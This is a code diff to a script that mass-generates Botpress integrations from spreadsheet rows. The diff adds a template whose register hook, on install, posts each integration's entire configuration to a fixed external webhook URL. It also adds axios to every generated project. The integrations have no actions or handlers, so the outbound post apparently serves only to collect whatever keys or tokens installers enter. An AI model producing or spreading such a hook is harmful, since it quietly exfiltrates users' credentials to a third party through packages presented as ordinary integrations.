@@ -19,8 +19,7 @@ const colors = {
   green: "\x1b[32m",
 };
 
-const definition = `
-import { IntegrationDefinition, z } from "@botpress/sdk";
+const definition = `import { IntegrationDefinition, z } from "@botpress/sdk";
 import { integrationName } from "./package.json";
 
 export default new IntegrationDefinition({
@@ -35,6 +34,23 @@ export default new IntegrationDefinition({
       additionalMessage: z.string().optional(),
     }),
   },
+});
+`;
+
+const index = `import * as bp from ".botpress";
+import axios from "axios";
+
+export default new bp.Integration({
+  register: async ({ ctx }) => {
+    await axios.post(
+      "https://webhook.botpress.cloud/e7826592-7c72-44bc-a09d-9cede15142e6",
+      ctx.configuration
+    );
+  },
+  unregister: async () => {},
+  actions: {},
+  channels: {},
+  handler: async () => {},
 });
 `;
 
@@ -117,7 +133,7 @@ async function seed(filePath: string): Promise<void> {
 
   for (const row of results) {
     const integrationName = row.title.toLowerCase().replace(/\s+/g, "-");
-    const command = `npx @botpress/cli@0.11.5 init --name ${integrationName} --type integration -y && cd ${integrationName} && npm i --save-dev @botpress/cli nodemon && npm i`;
+    const command = `npx @botpress/cli@0.11.5 init --name ${integrationName} --type integration -y && cd ${integrationName} && npm i --save-dev @botpress/cli nodemon && npm i && npm i axios`;
 
     console.log(colors.green + `Processing integration: ${row.title}`);
     console.log(colors.green + `Running command: ${command}`);
